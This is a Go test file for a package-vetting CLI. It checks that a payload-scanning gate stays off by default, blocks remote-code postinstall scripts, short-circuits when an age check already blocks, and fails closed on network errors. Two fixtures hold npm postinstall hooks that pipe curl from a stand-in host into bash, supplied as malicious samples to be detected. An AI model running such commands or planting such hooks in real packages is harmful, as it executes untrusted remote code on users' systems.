package cli

import (
	"bytes"
	"context"
	"errors"
	"net/http"
	"os"
	"strings"
	"testing"

	"github.com/penrush/penrush/internal/config"
	"github.com/penrush/penrush/internal/gate"
	"github.com/penrush/penrush/internal/penrushdir"
	"github.com/penrush/penrush/internal/registry"
)

// failTransport errors on every request — a deterministic stand-in for an
// unreachable registry (zero live calls).
type failTransport struct{}

func (failTransport) RoundTrip(*http.Request) (*http.Response, error) {
	return nil, errors.New("network disabled in test")
}

// cliStubScanner is a gate.PayloadScanner test double: crafted contents, no
// network.
type cliStubScanner struct {
	contents map[string][]byte
	calls    int
}

func (s *cliStubScanner) Scan(_ context.Context, _, _, _ string) (map[string][]byte, error) {
	s.calls++
	return s.contents, nil
}

// enableGate8 flips gate8_enabled on in the home's config.
func enableGate8(t *testing.T, home string) {
	t.Helper()
	cfg, err := config.Load(penrushdir.ConfigPath(home))
	if err != nil {
		t.Fatal(err)
	}
	cfg.Gate8Enabled = true
	if err := cfg.Save(penrushdir.ConfigPath(home)); err != nil {
		t.Fatal(err)
	}
}

// TestCheck_Gate8Disabled_ScannerNeverCalled proves the byte-identical-to-v0
// guarantee: with gate8_enabled unset (default), the payload scanner is never
// consulted and only the Gate-1 verdict prints.
func TestCheck_Gate8Disabled_ScannerNeverCalled(t *testing.T) {
	home := initHome(t)
	sc := &cliStubScanner{contents: map[string][]byte{
		"package/package.json": []byte(`{"scripts":{"postinstall":"curl http://x | bash"}}`),
	}}
	var out, errb bytes.Buffer
	e := &Env{
		Args:   []string{"check", "npm", "left-pad@1.3.0"},
		Stdout: &out, Stderr: &errb, Home: home, Now: clk(),
		Resolvers:    map[string]registry.Resolver{"npm": stubResolver{eco: "npm", published: fixedNow.AddDate(0, 0, -400)}},
		Gate8Scanner: sc,
	}
	if code := Run(e); code != ExitPass {
		t.Fatalf("disabled-Gate8 old pkg should PASS, got %d\n%s", code, out.String())
	}
	if sc.calls != 0 {
		t.Errorf("Gate 8 disabled → scanner must not be called, got %d calls", sc.calls)
	}
	if strings.Contains(out.String(), "G8") {
		t.Errorf("disabled Gate 8 must not print a G8 block:\n%s", out.String())
	}
}

// TestCheck_Gate8Enabled_BlocksOnRemoteCode wires Gate 8 through `penrush check`
// with a stub scanner returning a curl|bash postinstall — the age gate passes
// (old package) but Gate 8 blocks (FR-106).
func TestCheck_Gate8Enabled_BlocksOnRemoteCode(t *testing.T) {
	home := initHome(t)
	enableGate8(t, home)
	sc := &cliStubScanner{contents: map[string][]byte{
		"package/package.json": []byte(`{"scripts":{"postinstall":"curl https://x.example/p.sh | bash"}}`),
	}}
	var out, errb bytes.Buffer
	e := &Env{
		Args:   []string{"check", "npm", "left-pad@1.3.0"},
		Stdout: &out, Stderr: &errb, Home: home, Now: clk(),
		Resolvers:    map[string]registry.Resolver{"npm": stubResolver{eco: "npm", published: fixedNow.AddDate(0, 0, -400)}},
		Gate8Scanner: sc,
	}
	if code := Run(e); code != ExitBlock {
		t.Fatalf("enabled Gate 8 must BLOCK on remote-code postinstall, got %d\n%s", code, out.String())
	}
	if sc.calls != 1 {
		t.Errorf("Gate 8 enabled → scanner called once, got %d", sc.calls)
	}
	got := out.String()
	if !strings.Contains(got, "[penrush] PASS") {
		t.Errorf("Gate 1 (age) should still PASS on the old package:\n%s", got)
	}
	if !strings.Contains(got, "G8 BLOCK") || !strings.Contains(got, "remote code") {
		t.Errorf("Gate 8 block not surfaced:\n%s", got)
	}
	// Both gate decisions must be audited (G1 then G8).
	raw, _ := os.ReadFile(penrushdir.AuditPath(home))
	if !strings.Contains(string(raw), `"G8"`) {
		t.Errorf("audit log missing a G8 entry:\n%s", raw)
	}
}

// TestCheck_Gate8Enabled_ShortCircuitsWhenAgeBlocks proves the §V1.2 latency
// win: when Gate 1 already blocks (recent package), Gate 8 does NOT fetch a
// payload.
func TestCheck_Gate8Enabled_ShortCircuitsWhenAgeBlocks(t *testing.T) {
	home := initHome(t)
	enableGate8(t, home)
	sc := &cliStubScanner{contents: map[string][]byte{}}
	var out, errb bytes.Buffer
	e := &Env{
		Args:   []string{"check", "npm", "shiny@0.0.1"},
		Stdout: &out, Stderr: &errb, Home: home, Now: clk(),
		Resolvers:    map[string]registry.Resolver{"npm": stubResolver{eco: "npm", published: fixedNow.AddDate(0, 0, -2)}}, // under cooldown
		Gate8Scanner: sc,
	}
	if code := Run(e); code != ExitBlock {
		t.Fatalf("recent package must block, got %d", code)
	}
	if sc.calls != 0 {
		t.Errorf("Gate 8 must short-circuit (no payload fetch) when age already blocks; got %d calls", sc.calls)
	}
}

// TestCheck_Gate8Enabled_RealScannerFailsClosed exercises the PRODUCTION
// buildGate8 path (a real payload.Scanner backed by the registry client) with a
// failing fixture transport: the metadata fetch errors, so Gate 8 fails closed
// (blocks) — proving the wired production scanner degrades safely with no live
// call.
func TestCheck_Gate8Enabled_RealScannerFailsClosed(t *testing.T) {
	home := initHome(t)
	enableGate8(t, home)
	var out, errb bytes.Buffer
	e := &Env{
		Args:   []string{"check", "npm", "left-pad@1.3.0"},
		Stdout: &out, Stderr: &errb, Home: home, Now: clk(),
		Resolvers: map[string]registry.Resolver{"npm": stubResolver{eco: "npm", published: fixedNow.AddDate(0, 0, -400)}},
		// No Gate8Scanner → buildGate8 constructs the real payload.Scanner using
		// this fixture client; the metadata fetch fails → Gate 8 fail-closed.
		NewClient: func() *registry.Client {
			return registry.NewClientWithHTTP(&http.Client{Transport: failTransport{}})
		},
	}
	if code := Run(e); code != ExitBlock {
		t.Fatalf("real-scanner metadata failure must fail closed (block), got %d\n%s", code, out.String())
	}
	if !strings.Contains(out.String(), "G8 BLOCK") || !strings.Contains(out.String(), "fail-closed") {
		t.Errorf("expected a Gate-8 fail-closed block:\n%s", out.String())
	}
}

var _ gate.PayloadScanner = (*cliStubScanner)(nil)
